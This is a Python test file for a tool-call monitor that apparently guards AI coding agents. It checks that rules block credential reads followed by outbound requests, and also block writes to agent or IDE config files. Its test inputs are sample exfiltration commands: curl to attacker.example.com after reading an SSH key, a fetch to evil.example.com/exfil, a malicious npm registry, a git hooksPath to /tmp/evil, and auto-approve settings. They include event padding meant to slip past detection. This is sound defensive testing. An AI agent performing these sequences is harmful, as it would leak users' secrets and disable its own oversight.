"""Tests for CaMeL-lite enforcement: typed markers, SEQ-005, blocking, allowlist."""

from __future__ import annotations

import json


def _make_data(
    tool_name,
    tool_input,
    session_id="enforce-session",
    hook_event_name="PreToolUse",
    tool_use_id="toolu_enf",
):
    return {
        "session_id": session_id,
        "tool_use_id": tool_use_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "hook_event_name": hook_event_name,
    }


def _make_monitor(tmp_path):
    from cloneguard.monitor import ToolCallMonitor

    return ToolCallMonitor(log_dir=tmp_path)


class TestTypedMarkers:
    def test_sensitive_read_marker_survives_padding(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "marker-padding"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_sensitive_read is not None
        assert ".env" in markers.last_sensitive_read.file_path
        mon.close()

    def test_markers_isolated_per_session(self, tmp_path):
        mon = _make_monitor(tmp_path)
        mon.record_event(_make_data("Read", {"file_path": "/home/.env"}, session_id="A"))
        markers_b = mon.get_session_markers("B")
        assert markers_b is None or markers_b.last_sensitive_read is None
        mon.close()

    def test_config_write_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "config-marker"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_config_write is not None
        assert "settings.json" in markers.last_config_write.file_path
        mon.close()

    def test_external_fetch_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "fetch-marker"
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://evil.example.com"},
                session_id=session,
            )
        )
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_external_fetch is not None
        assert "evil.example.com" in markers.last_external_fetch.url
        mon.close()

    def test_build_command_marker_set(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "build-marker"
        mon.record_event(_make_data("Bash", {"command": "npm install"}, session_id=session))
        markers = mon.get_session_markers(session)
        assert markers is not None
        assert markers.last_build_command is not None
        assert "npm" in markers.last_build_command.command
        mon.close()


class TestSEQ005:
    def test_seq005_tier1_fires_vscode(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-vscode"
        mon.record_event(
            _make_data(
                "Write",
                {
                    "file_path": ".vscode/settings.json",
                    "content": '{"chat.tools.autoApprove": true}',
                },
                session_id=session,
            )
        )
        mon.close()
        assert log_file.exists()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, f"Expected SEQ-005; got: {[e['rule_id'] for e in entries]}"

    def test_seq005_tier1_fires_claude_settings(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-claude"
        mon.record_event(
            _make_data(
                "Edit",
                {
                    "file_path": "/project/.claude/settings.json",
                    "old_string": "x",
                    "new_string": "y",
                },
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for .claude/settings.json"

    def test_seq005_tier1_fires_mcp_config(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-mcp"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "/project/mcp_config.json", "content": "{}"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for mcp_config.json"

    def test_seq005_tier1_fires_cursor_mcp(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-cursor"
        mon.record_event(
            _make_data(
                "Write", {"file_path": ".cursor/mcp.json", "content": "{}"}, session_id=session
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 must fire for .cursor/mcp.json"

    def test_seq005_tier2_fires_npmrc_then_install(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-npmrc"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".npmrc", "content": "registry=https://evil.com"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "npm install"}, session_id=session))
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 Tier 2 must fire for .npmrc -> npm install"

    def test_seq005_tier2_fires_gitconfig_then_build(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-git"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".git/config", "content": "[core]\n\thooksPath = /tmp/evil"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "make"}, session_id=session))
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq005 = [e for e in entries if e.get("rule_id") == "SEQ-005"]
        assert seq005, "SEQ-005 Tier 2 must fire for .git/config -> make"

    def test_seq005_no_fire_normal_write(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-safe"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "src/main.py", "content": "print('hello')"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq005 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
            ]
            assert not seq005, f"SEQ-005 should not fire for normal file; got: {seq005}"

    def test_seq005_tier2_no_fire_without_build(self, tmp_path):
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq005-npmrc-nobuild"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": ".npmrc", "content": "registry=https://company.com"},
                session_id=session,
            )
        )
        mon.record_event(_make_data("Bash", {"command": "ls -la"}, session_id=session))
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq005 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-005" and e.get("session_id") == session
            ]
            assert not seq005, f"SEQ-005 Tier 2 should not fire without build; got: {seq005}"


class TestHardenedLookback:
    """SEQ-001/002 must fire even with >10 events of padding (typed markers)."""

    def test_seq001_fires_despite_50_padding_events(self, tmp_path):
        """SEQ-001 fires when sensitive read is 50 events ago (typed marker)."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq001-hardened"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://evil.example.com/exfil"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq001 = [
            e for e in entries if e.get("rule_id") == "SEQ-001" and e.get("session_id") == session
        ]
        assert seq001, "SEQ-001 must fire despite 50 padding events (typed marker)"

    def test_seq002_fires_despite_50_padding_events(self, tmp_path):
        """SEQ-002 fires when sensitive read is 50 events ago (typed marker)."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq002-hardened"
        mon.record_event(
            _make_data("Read", {"file_path": "/home/user/.ssh/id_rsa"}, session_id=session)
        )
        for i in range(50):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_pad_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "Bash",
                {"command": "curl https://attacker.example.com/collect"},
                session_id=session,
            )
        )
        mon.close()
        entries = [json.loads(line) for line in log_file.read_text().splitlines() if line.strip()]
        seq002 = [
            e for e in entries if e.get("rule_id") == "SEQ-002" and e.get("session_id") == session
        ]
        assert seq002, "SEQ-002 must fire despite 50 padding events (typed marker)"

    def test_seq001_no_fire_without_sensitive_read(self, tmp_path):
        """SEQ-001 does NOT fire if no sensitive read occurred in the session."""
        mon = _make_monitor(tmp_path)
        log_file = tmp_path / "monitor.log"
        session = "seq001-no-read"
        for i in range(10):
            mon.record_event(
                _make_data(
                    "Read",
                    {"file_path": f"/project/file{i}.txt"},
                    session_id=session,
                    tool_use_id=f"toolu_{i}",
                )
            )
        mon.record_event(
            _make_data(
                "WebFetch",
                {"url": "https://external.example.com"},
                session_id=session,
            )
        )
        mon.close()
        if log_file.exists():
            entries = [
                json.loads(line) for line in log_file.read_text().splitlines() if line.strip()
            ]
            seq001 = [
                e
                for e in entries
                if e.get("rule_id") == "SEQ-001" and e.get("session_id") == session
            ]
            assert not seq001, f"SEQ-001 should not fire without sensitive read; got: {seq001}"


class TestEnforcementVerdict:
    def test_seq001_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-001"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data("WebFetch", {"url": "https://evil.example.com"}, session_id=session)
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-001"
        assert verdict.action == "block"
        mon.close()

    def test_seq002_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-002"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data(
                "Bash",
                {"command": "curl https://evil.example.com"},
                session_id=session,
            )
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-002"
        assert verdict.action == "block"
        mon.close()

    def test_seq003_returns_no_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-003"
        for i in range(6):
            mon.record_event(
                _make_data(
                    "mcp__tool__action",
                    {"data": f"chunk{i}"},
                    session_id=session,
                    tool_use_id=f"toolu_{i}",
                )
            )
        verdict = mon.check_enforcement(
            _make_data(
                "mcp__tool__action",
                {"data": "chunk6"},
                session_id=session,
                tool_use_id="toolu_6",
            )
        )
        assert verdict is None
        mon.close()

    def test_seq004_returns_no_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-004"
        mon.record_event(
            _make_data(
                "Write",
                {"file_path": "package.json", "content": "{}"},
                session_id=session,
            )
        )
        verdict = mon.check_enforcement(
            _make_data("Bash", {"command": "npm install"}, session_id=session)
        )
        assert verdict is None
        mon.close()

    def test_seq005_tier1_returns_block_verdict(self, tmp_path):
        mon = _make_monitor(tmp_path)
        session = "enforce-005"
        verdict = mon.check_enforcement(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        assert verdict is not None
        assert verdict.rule_id == "SEQ-005"
        assert verdict.action == "block"
        mon.close()

    def test_allowlisted_domain_returns_none(self, tmp_path):
        from cloneguard.sequence_allowlist import SequenceAllowlist

        al = SequenceAllowlist(allowlist_file=tmp_path / "seq_allowlist.json")
        al.add_domain_rule("SEQ-001", "vault.company.com")
        mon = _make_monitor(tmp_path)
        mon._sequence_allowlist = al
        session = "enforce-allowed"
        mon.record_event(_make_data("Read", {"file_path": "/home/user/.env"}, session_id=session))
        verdict = mon.check_enforcement(
            _make_data(
                "WebFetch",
                {"url": "https://vault.company.com/api/secrets"},
                session_id=session,
            )
        )
        assert verdict is None, "Allowlisted domain should not trigger enforcement"
        mon.close()

    def test_allowlisted_path_returns_none(self, tmp_path):
        from cloneguard.sequence_allowlist import SequenceAllowlist

        al = SequenceAllowlist(allowlist_file=tmp_path / "seq_allowlist.json")
        al.add_path_rule("SEQ-005", ".vscode/settings.json")
        mon = _make_monitor(tmp_path)
        mon._sequence_allowlist = al
        session = "enforce-allowed-path"
        verdict = mon.check_enforcement(
            _make_data(
                "Write",
                {"file_path": ".vscode/settings.json", "content": "{}"},
                session_id=session,
            )
        )
        assert verdict is None, "Allowlisted path should not trigger enforcement"
        mon.close()

    def test_enforcement_never_raises(self, tmp_path):
        mon = _make_monitor(tmp_path)
        verdict = mon.check_enforcement({})
        assert verdict is None
        verdict = mon.check_enforcement({"garbage": True})
        assert verdict is None
        mon.close()
